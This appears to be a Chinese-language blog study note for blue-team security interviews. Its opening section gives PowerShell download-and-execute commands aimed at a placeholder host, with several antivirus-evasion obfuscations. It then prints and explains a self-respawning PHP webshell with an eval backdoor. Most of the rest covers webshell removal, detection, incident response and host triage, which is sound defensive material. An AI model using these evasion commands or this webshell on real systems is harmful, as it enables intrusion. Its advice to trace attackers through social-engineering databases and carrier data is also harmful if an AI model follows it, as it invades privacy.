<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">同行业可能存在类似的系统，甚至于采用同一家厂商的系统，可互做对比</span><br><span class="line">通用：办公OA、邮件系统、VPN等</span><br><span class="line">医院：门户、预约系统、掌上医院、微信公众平台等</span><br></pre></td></tr></table></figure>
<h2 id="免杀了解过多少">免杀了解过多少</h2>
<ul>
<li>
<p>有源码免杀</p>
</li>
<li>
<p>无源码免杀</p>
</li>
<li>
<p>powershell免杀</p>
</li>
</ul>
<h3 id="powershell免杀">powershell免杀</h3>
<p>powershell木马最常用的方式一般都为远程下载然后执行的方法,特点就是:直接内存运行,无文件落地.</p>
<p>例如:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-c</span> <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://x.x.x.x/a&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>
<p>通常使用过程中当调用powershell进行远程下载执行时，会被杀软进行拦截。那么针对Powershell的免杀有两个思路：</p>
<p>对ps1文件进行免杀处理</p>
<p>对Powershell的行为进行免杀处理</p>
<h4 id="免杀方法">免杀方法</h4>
<h5 id="使用关键字拆分进行bypass">使用关键字拆分进行bypass</h5>
<p>例如，拆分前的powershell命令为：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://x.x.x.x/a&#x27;))”</span></span><br></pre></td></tr></table></figure>
<p>假如杀软是对http这个关键字进行检测，那么我们可以对其进行如下拆分进行绕过，拆分后的powershell命令为</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="string">&quot;<span class="variable">$a</span>=&#x27;IEX((New-Object Net.WebClient).DownloadString(&#x27;&#x27;ht&#x27;;<span class="variable">$b</span>=&#x27;tp://x.x.x.x/a&#x27;&#x27;));Invoke-Mimikatz&#x27;;IEX (<span class="variable">$a</span>+<span class="variable">$b</span>)”</span></span><br></pre></td></tr></table></figure>
<p>假如是对downloadstring这个函数进行检测，那么我们可以使用replace来进行替换函数拆分downloadstring进行一个绕过，拆分后的powershell命令如下：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="string">&quot;<span class="variable">$a</span>=&#x27;IEX(New-Object Net.WebClient).Downlo&#x27;;<span class="variable">$b</span>=&#x27;123(&#x27;&#x27;http://x.x.x.x&#x27;&#x27;)&#x27;.Replace(&#x27;123&#x27;,&#x27;adString&#x27;);IEX (<span class="variable">$a</span>+<span class="variable">$b</span>)&quot;</span></span><br></pre></td></tr></table></figure>
<h5 id="Fuzz思想进行bypass">Fuzz思想进行bypass</h5>
<p>可以利用Fuzz的思想进行bypass</p>
<p>例如单引号混淆前的命令为:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://x.x.x.x/a’))”</span></span><br></pre></td></tr></table></figure>
<p>使用单引号混淆后的命令为：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;ht‘+’tp://x.x.x.x/a’))”</span></span><br></pre></td></tr></table></figure>
<h5 id="超长命令bypass">超长命令bypass</h5>
<p>可以使用超长的命令来进行bypass。<br>
例如，利用超长命令bypas前的powershell命令为：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="string">&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://x.x.x.x/a’))”</span></span><br></pre></td></tr></table></figure>
<p>进行超长命令构造后的powershell命令为</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal w Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="built_in">IEX</span> ((<span class="built_in">new-object</span> net.webclient).downloadstring(<span class="string">&#x27;http://x.x.x.x/a&#x27;</span>))</span><br></pre></td></tr></table></figure>
<h5 id="使用copy命令进行bypass">使用copy命令进行bypass</h5>
<p>这里讲一个骚操作，一些杀软是检测powershell这个使用的动作，那么我们可以使用windows的copy命令，将powshell进行拷贝命名为其他的，例如，使用copy命令将powershell拷贝一个并命名为bypass.txt<br>
命令：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> C:\Windows\System32\WindowsPowerShell\v1.<span class="number">0</span>\powershell.exe bypass.txt</span><br></pre></td></tr></table></figure>
<p>那么后面就可以这样子来执行powershell来进行绕过杀软检测：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bypass.txt <span class="built_in">IEX</span> ((<span class="built_in">new-object</span> net.webclient).downloadstring(<span class="string">&#x27;http://x.x.x.x/a&#x27;</span>))</span><br></pre></td></tr></table></figure>
<h5 id="混合bypass">混合bypass</h5>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="literal">-w</span> Normal <span class="built_in">set-alias</span> <span class="literal">-name</span> key <span class="literal">-value</span> <span class="built_in">IEX</span>; key(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;ht‘+’tp://x.x.x.x/a&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>跟不知道有没有逆着读命令进行绕过的方法</p>
<h2 id="不死马查杀">不死马查杀</h2>
<p>看一个简单的不死马例子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line">    <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&#x27;.ZYGS.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_GET[&quot;zygs&quot;])==&quot;e10adc3949ba59abbe56e057f20f883e&quot;)&#123;@eval($_POST[&quot;ZYGS&quot;]);&#125;?&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line">        <span class="title function_ invoke__">usleep</span>(<span class="number">5000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>解析</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);   <span class="comment">//设置与远程客户端断开后是否继续执行脚本，true即不断开</span></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);   <span class="comment">//设置脚本最大的执行时间，0即没有时间限制</span></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);   <span class="comment">//删除文件本身</span></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;.ZYGS.php&#x27;</span>;   <span class="comment">//文件名是.ZYGS.php</span></span><br><span class="line"><span class="variable">$code</span> = <span class="meta">&lt;?php</span> <span class="meta">?&gt;</span>;   <span class="comment">//php代码</span></span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(file,code);   <span class="comment">//打开file文件，然后写入code</span></span><br><span class="line"><span class="title function_ invoke__">usleep</span>(<span class="number">5000</span>);   <span class="comment">//每隔usleep(5000)写入一个新文件</span></span><br></pre></td></tr></table></figure>
<p><code>unlink</code>就是为了删除传入的不死马文件,避免一些不必要的信息泄露出去,$file中可以规定你要不断生成的文件名,</p>
<p>usleep(time)是生成木马的时间;这也是不死马的灵魂之一,通过不断生成文件在当前目录下,形成了不死马,不死马是一个进程所以往往要重启主机或重启服务才能kill掉,当然也可以条件竞争</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&quot;zygs&quot;</span>])==<span class="string">&quot;e10adc3949ba59abbe56e057f20f883e&quot;</span>)&#123;@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;ZYGS&quot;</span>]);&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这段代码是为了防止骑马(<strong>在以往的一句话木马中，密码简单方便呈现给了用户，如果在AWD中，知道了密码的话，就可以反手打一波其他的主机，因为如果是被批量种马的话，所有人都一样，这也就是&quot;骑马&quot;</strong>)，通过判断用户传入的变量，然后转换成md5值和e10adc3949ba59abbe56e057f20f883e进行对比，如果e10adc3949ba59abbe56e057f20f883e解密出来的值和用户传入的值是一样的话，就继续执行@eval($_POST[‘ZYGS’]),这也是整个不死马中的灵魂，就是为了防止乌鸦坐飞机，一个人拿分</p>
<p>(e10adc3949ba59abbe56e057f20f883e == 123456)</p>
<p>触发后,虽然web页面没有,但是在后台可以看到</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/ae3731bf20d64b4784488dc918688854.png" alt="在这里插入图片描述"></p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/c8211ed70d2e405eb775156b428d470c.png" alt="在这里插入图片描述"></p>
<h3 id="root用户角度的查杀">root用户角度的查杀</h3>
<h4 id="杀掉进程">杀掉进程</h4>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep www-data | awk ‘&#123;<span class="built_in">print</span> <span class="variable">$2</span>&#125;’ | xargs <span class="built_in">kill</span> -9</span><br><span class="line">然后重启服务</span><br></pre></td></tr></table></figure>
<h4 id="其他用户的查杀">其他用户的查杀</h4>
<p>在awd中，ctf用户没有权限，不能重启服务，而且，以ctf的用户来杀进程和条件竞争也是不可行的。（不死马会先创建，然后被删除，在创建到被删除的过程中会可利用。）</p>
<p>最简单的方式就是以www-data用户的角度通过杀进程来实现查杀。</p>
<h5 id="杀掉进程：">杀掉进程：</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @system(&quot;ps -aux | grep www-data | awk &#x27;&#123;print $2&#125;&#x27; | xargs kill -9&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
<h5 id="条件竞争">条件竞争:</h5>
<p>不推荐，如果不死马中没有调用usleep()函数，进行延时的话，条件竞争是gg的。</p>
<h2 id="排查出来一句话木马-没有日志怎么找">排查出来一句话木马,没有日志怎么找</h2>
<h3 id="检查网站目录">检查网站目录</h3>
<p>看是否有可疑的代码或者文件名。</p>
<h3 id="利用PHP的-功能">利用PHP的 功能</h3>
<ul>
<li>
<p>利用PHP的 disable_functions 功能,禁用一些常用的执行命令的函数，如 eval , assert , system , exec 等。</p>
</li>
<li>
<p>利用PHP的 safe_mode 功能，开启安全模式，限制PHP脚本的权限和功能。</p>
</li>
<li>
<p>利用WAF或者IDS等安全设备或软件，对一句话木马的特征进行检测和拦截。</p>
</li>
<li>
<p>利用文件监控或者日志分析等手段，及时发现和处理异常的文件或者请求。</p>
</li>
</ul>
<h3 id="检查网络流量">检查网络流量</h3>
<p>使用网络监控工具分析网络流量，以检测与已知恶意主机或IP地址之间的通信。这可能会暴露任何存在的后门或远程控制连接。</p>
<h2 id="别人已经将木马传到主机时-怎么排查">别人已经将木马传到主机时,怎么排查</h2>
<p>同系统排查,进程,启动项,服务,网络连接端口检查,任务计划排查,用户信息检查</p>
<h2 id="如何溯源">如何溯源</h2>
<h3 id="答案一">答案一:</h3>
<p><code>判断Webshell事件发生时间</code>：根据异常现象发生时间，结合网站目录中Webshell文件的创建时间，可大致定位事件发生的时间段。以便后续依据此时间进行溯源分析、追踪攻击者的活动路径。</p>
<p><code>对攻击路径进行溯源分析</code>：如果网站被植入暗链或出现单击链接跳转到其他网站(如博彩网站、色情网站等)的情况，应首先排查网站首页相关js，查看是否被植入了恶意跳转的js。<br>
若网站首页被篡改或有其他被攻击的现象，可以根据网站程序信息，如程序目录、文件上传目录、war包部署目录，使用工具(如D盾)和搜索关键词(如eval、 base64_ decode、assert)方式，定位到Webshell文件并清除。然后根据日志进行溯源分析，同时除了进行Web应用层排查，还应对系统层进行全面排查，防止攻击者在获取Webshel后执行了其他的权限维持操作。</p>
<p><code>判断系统架构</code>：收集系统信息，为快速溯源分析提供前期准备工作</p>
<table>
<thead>
<tr>
<th>项目</th>
<th>内容</th>
</tr>
</thead>
<tbody>
<tr>
<td>服务器</td>
<td>Windows、Linux等</td>
</tr>
<tr>
<td>内容管理系统(CMS)</td>
<td>Jeecms、Wordpress、 Drupal、 TRS WCM、Phpcms、 Dedecms 等</td>
</tr>
<tr>
<td>中间件</td>
<td>Tomcat、IIS、 Apache、 WebLogic、 JBoss、 Websphere、 Jetty 等</td>
</tr>
<tr>
<td>框架</td>
<td>Struts2、Thinkphp、 Spring、 Shiro、 Fastjson 等</td>
</tr>
<tr>
<td>数据库</td>
<td>Tomcat、IIS、 Apache、 WebLogic、 Struts、 MySQL等</td>
</tr>
<tr>
<td>脚本语言</td>
<td>ASP、PHP、JSP 等</td>
</tr>
<tr>
<td>业务架构</td>
<td>如前端网页内容是否是后端通过FTP上传的(新闻网偏多)等</td>
</tr>
</tbody>
</table>
<h3 id="答案二">答案二</h3>
<h4 id="针对-ip-溯源一二">针对 ip 溯源一二</h4>
<p>一般来说，红队大部分都是使用代理节点进行测试，假如我们捕获或者从样本里面分析拿到了真实的 ip, 那么以下的操作场景就有用了，或者使用钓鱼反调的方式去获取到真实的 ip</p>
<h4 id="来自创宇盾等节点的流量-ip">来自创宇盾等节点的流量 ip</h4>
<p>ip, 假设前面还有一层云 waf cdn 厂商等。那么需要协调到提供服务的厂商，快速获取到云 waf 或者 cdn 之前的节点真实 ip. 然后拿到了真实的 ip, 就变成了一些常规的溯源操作</p>
<h4 id="whois-域名反查">whois 域名反查</h4>
<p>ip, 初步可以进行 whois 查询，以及域名反查，查看历史的解析，以及历史的 ip 用有记录，运气好的话，假如攻击队队员使用的是自己的博客之类的 vps 常用节点，那么很有可能通过这个手法进行溯源到相关人员</p>
<h4 id="探测端口-服务-进行反渗透">探测端口 服务 进行反渗透</h4>
<p>ip, 对该 ip 进行端口探测，服务探测，进行反渗透，一般来说红队的 vps 都是在一些国内的一些 vps 主机供应商或者云服务供应商那边购买，假如是国内的话，可以通过公安网警来进行协助查水表，获取真实人员的身份。假如我们反渗透成功，那么可以提取历史登入记录，历史 ip, 网络连接，进程 以及攻击工具 进程 内存镜像等方式进行取证分析.</p>
<h4 id="威胁情报">威胁情报</h4>
<p>ip, 对使用威胁情报进行综合分析，查看该 ip 他人对该 ip 打的标签，历史解析记录，历史变更记录，以及该 ip 上面关联的相关样本，这些都能够获取到进行进一步分析.</p>
<h4 id="邮箱-qq-手机号-社工库">邮箱 qq 手机号 社工库</h4>
<p>通过 ip 的 whois 获取到了相关人员的 qq 或者邮箱或者手机号，那么可以使用社工库，进行社工查询。比如 twitter 的社工库机器人或者自行研究的社工库进行综合关联分析</p>
<h4 id="qq-微信-抖音-陌陌-等接口">qq 微信 抖音 陌陌 等接口</h4>
<p>获取到了手机号，那么可以通过 qq 微信 抖音 陌陌 等接口进行关联，一般获取到了手机号初步可以通过这种简单易行的手法去溯源到红队人员</p>
<h4 id="ga-数据-运营商数据">ga 数据 运营商数据</h4>
<p>有办法能通过 ga 资源，或者直接通过运营商拿数据，那就更好了</p>
<h2 id="流量检测设备和态势感知设备发生报警，对警告进行分析，讲一下你流量分析和上机排查的思路">流量检测设备和态势感知设备发生报警，对警告进行分析，讲一下你流量分析和上机排查的思路</h2>
<h3 id="排查一下是否是误报">排查一下是否是误报</h3>
<p>先判断是否是恶意攻击行为</p>
<p>如果判断不了或者判断是真正的攻击行为立即上报</p>
<h3 id="排查主机上面是否有其他的告警情况">排查主机上面是否有其他的告警情况</h3>
<p>如果存在首先隔绝该主机与其他主机的联系,可能的话关闭主机服务</p>
<h3 id="上机排查">上机排查</h3>
<p>首先排查服务日志情况,查看通过什么方式修补漏洞</p>
<p>其次查看主机操作日志 是否有其他横向渗透,或者权限维持手段</p>
<h2 id="ip代理如何排查">ip代理如何排查</h2>
<p>具体来说 看 X-Forwarded-For 请求头</p>
<p><strong>面试官问的时候是这样问的:</strong><br>
如果对方一分钟换一个IP怎么办</p>
<p>红队的ip不可能是无限的 可以寻找 一段时间内的规律进行统一封禁</p>
<p>或者根据攻击方的流量特征来进行封禁</p>
<h2 id="域内横向移动">域内横向移动</h2>
<p>划重点:参考文章</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pingmaoer.github.io/2020/06/27/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%80/</span><br></pre></td></tr></table></figure>
<p>利用域内横向移动技术,以被攻陷的系统为跳板,访问其他域内主机,扩大资产范围(包括跳板机器中的文档和存储的凭证，以及通过跳板机器连接的数据库、域控制器或其他重要资产)</p>
<p><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/1.png" alt="1"></p>
<p>通过此类攻击手法,最终可能获取域控制器的访问权限,甚至完全控制基于Windows操作系统的基础设置和与业务相关的关键账户</p>
<h3 id="0x01-常用的windows远程连接和相关命令">0x01 常用的windows远程连接和相关命令</h3>
<h4 id="0x02-Windoors系统散列值获取">0x02 Windoors系统散列值获取</h4>
<h4 id="0x03-哈希传递攻击">0x03 哈希传递攻击</h4>
<h4 id="0x04票据传递">0x04票据传递</h4>
<h2 id="Webshell应急响应流程">Webshell应急响应流程</h2>
<h3 id="判断是否被植入webshell">判断是否被植入webshell</h3>
<p><code>系统被植入Webshell,可能出现一下几个异常</code>:</p>
<p>网页被篡改，或在网站中发现非管理员设置的内容;</p>
<p>出现攻击者恶意篡改网页或者网页被植入暗链的现象</p>
<p>安全设备报警</p>
<h4 id="临时处理">临时处理</h4>
<p>删除检测到的Webshell文件,对文件进行备份,方便后续取证溯源</p>
<p>对系统进行隔离,防止影响其他系统</p>
<p><code>扫描工具</code>:</p>
<ul>
<li>D盾</li>
</ul>
<p>Webshell 可疑文件隔离 端口进程查看 base64解码 以及克隆用户检测等 文件监控</p>
<ul>
<li>河马Webshell查杀</li>
</ul>
<p>河马Webshell拥有海量的Webshell样本和自主查杀技术,采用传统特征+云端大数据双引擎的查杀技术</p>
<h3 id="webshell查杀">webshell查杀</h3>
<h4 id="Windows系统排查">Windows系统排查</h4>
<p>利用Webshell扫描工具(如D盾)对应用部署目录进行扫描，如网站D: \WWW\目录，或者将当前网站目录文件与此前备份文件进行比对，查看是否存在新增的不一致内容，确定是否包含Webshell相关信息， 并确定Webshel位置及创建时间。然后利用文本文件打开，进一步分析发现可疑内容。</p>
<h4 id="Linux系统排查">Linux系统排查</h4>
<p>在Windows系统中使用的Webshell检测方法在Linux系统中同样适用。在Linux系统中，可用河马Webshell查杀工具扫描，也可手工搜索可能包含Webshell特征的文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//搜索目录下适配当前应用的网页文件，查看内容是否有Webshell特征</span><br><span class="line">find ./ type f -name &quot;*.jsp&quot; | xargs grep &quot;exec(&quot; </span><br><span class="line">find ./ type f -name &quot;*.php&quot; | xargs grep &quot;eval(&quot; </span><br><span class="line">find ./ type f -name &quot;*.asp&quot; | xargs grep &quot;execute(&quot; </span><br><span class="line">find ./ type f -name &quot;*.aspx&quot; | xargs grep &quot;eval(&quot; </span><br><span class="line"></span><br><span class="line">//对于免杀Webshell，可以查看是否使用编码</span><br><span class="line">find ./ type f -name &quot;*.php&quot; | xargs grep &quot;base64_decode&quot; </span><br></pre></td></tr></table></figure>
<p><code>判断Webshell事件发生时间</code>：根据异常现象发生时间，结合网站目录中Webshell文件的创建时间，可大致定位事件发生的时间段。以便后续依据此时间进行溯源分析、追踪攻击者的活动路径。</p>
<p><code>对攻击路径进行溯源分析</code>：如果网站被植入暗链或出现单击链接跳转到其他网站(如博彩网站、色情网站等)的情况，应首先排查网站首页相关js，查看是否被植入了恶意跳转的js。<br>
若网站首页被篡改或有其他被攻击的现象，可以根据网站程序信息，如程序目录、文件上传目录、war包部署目录，使用工具(如D盾)和搜索关键词(如eval、 base64_ decode、assert)方式，定位到Webshell文件并清除。然后根据日志进行溯源分析，同时除了进行Web应用层排查，还应对系统层进行全面排查，防止攻击者在获取Webshel后执行了其他的权限维持操作。</p>
<p><code>判断系统架构</code>：收集系统信息，为快速溯源分析提供前期准备工作</p>
<table>
<thead>
<tr>
<th>项目</th>
<th>内容</th>
</tr>
</thead>
<tbody>
<tr>
<td>服务器</td>
<td>Windows、Linux等</td>
</tr>
<tr>
<td>内容管理系统(CMS)</td>
<td>Jeecms、Wordpress、 Drupal、 TRS WCM、Phpcms、 Dedecms 等</td>
</tr>
<tr>
<td>中间件</td>
<td>Tomcat、IIS、 Apache、 WebLogic、 JBoss、 Websphere、 Jetty 等</td>
</tr>
<tr>
<td>框架</td>
<td>Struts2、Thinkphp、 Spring、 Shiro、 Fastjson 等</td>
</tr>
<tr>
<td>数据库</td>
<td>Tomcat、IIS、 Apache、 WebLogic、 Struts、 MySQL等</td>
</tr>
<tr>
<td>脚本语言</td>
<td>ASP、PHP、JSP 等</td>
</tr>
<tr>
<td>业务架构</td>
<td>如前端网页内容是否是后端通过FTP上传的(新闻网偏多)等</td>
</tr>
</tbody>
</table>
<h3 id="系统排查">系统排查</h3>
<p>攻击者上传Webshell后,往往还会执行进一步的操作,如提权,添加用户,写入系统后门,实现持久化驻留.因此,还需要对系统进行排查,主要排查内容如下</p>
<h4 id="Windows系统排查-2">Windows系统排查</h4>
<h5 id="用户信息排查">用户信息排查</h5>
<p><strong>用户排查:</strong></p>
<p>使用<code>net user</code>命令,可直接查看用户信息(此方法看不到隐藏用户),若发现存在非管理员使用账户,则可能为异常账户</p>
<p>如果需查看某个账户的详细信息,可以使用<code>net user username</code>命令</p>
<p><code>隐藏用户排查</code></p>
<p>打开计算机管理–&gt;本地用户和组.可查询隐藏用户.用户名称以$结尾的为隐藏用户,当然还有一种方法在github是有自动检测的工具</p>
<p><code>克隆用户排查</code></p>
<p>可使用注册表,利用F值进行对比,以排查克隆用户.也可以直接使LP_Check工具排查克隆用户</p>
<h5 id="进程、服务、驱动、启动项排查">进程、服务、驱动、启动项排查</h5>
<p><strong>进程排查:</strong></p>
<p>在排查可疑进程时，可以关注进程名称，对于异常的、不常见的名称要格外注意，另外可以重点观察进程的路径、CPU占用信息等。打开<code>系统信息</code>和<code>任务管理器</code>窗口，均可查看进程名称及其对应的执行文件。</p>
<p>进程信息还可以使用PCHunter工具查看,</p>
<p><strong>黑色条目</strong>代表微软进程</p>
<p><strong>蓝色条目</strong>代表非微软进程,可能是第三方应用程序进程,蓝色缺失文件厂商信息的几次呢需多加关注</p>
<p><strong>红色条目</strong>代表可疑进程,隐藏服务,被挂钩函数</p>
<p><strong>服务排查:</strong></p>
<p>在<code>系统信息窗口--&gt;软件环境--&gt;服务</code>,可查看服务的启动情况及其对应的启动文件</p>
<p>或使用<code>services.msc</code>命令,也可直接查看服务,查找异常服务.</p>
<p><strong>驱动,启动项排查:</strong></p>
<p>命令行<code>msconfig</code>打开启动项;</p>
<h5 id="网络连接排查">网络连接排查</h5>
<p><code>netstat -ano</code> 查看是否有可疑连接</p>
<p>根据<code>netstat -ano</code> 定位出的pid，再通过tasklist命令进行进程定位 <code>tasklist | findstr “PID”</code></p>
<h5 id="任务计划排查">任务计划排查</h5>
<p>攻击者在攻击成功后,添加任务计划往往是为了持久化控制.任务计划日志通常存放在<code>C:\Windows\System32\Tasks</code>目录下,可以直接打开系统自带的<code>任务计划程序</code>窗口进行查看</p>
<p>自定义的任务计划，则较为可疑，需进行排查。</p>
<h5 id="文件排查">文件排查</h5>
<p>攻击者在攻击成功后可能会在本地留下过程文件,这时需要排查各个盘符下的相关敏感目录，以便确定是否存在异常文件。</p>
<p><code>temp相关目录：</code><br>
temp指系统临时文件夹，用于存储系统临时文件。在Windows系统中，常见temp目录主要分<br>
布在如下位置:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\temp</span><br><span class="line">C:\Users\Administrator\AppData\Local\temp</span><br></pre></td></tr></table></figure>
<p>在寻找可疑文件时，先重点查看攻击时间范围内的文件，然后通过文件命令来判断。一般凡是在非系统System32或Syswow64目录下的svchost.exe文件基本为恶意文件；另外，命名特殊的文件也要重点排查。发现可疑文件后，可以提取样本做进一步的鉴定。</p>
<h4 id="linux系统排查">linux系统排查</h4>
<h5 id="账户排查">账户排查</h5>
<p><code>用户信息文件</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">account:password:UID:GID:GECOS:directory:shell</span><br><span class="line">用户名：密码：用户ID：组ID：用户说明：家目录</span><br></pre></td></tr></table></figure>
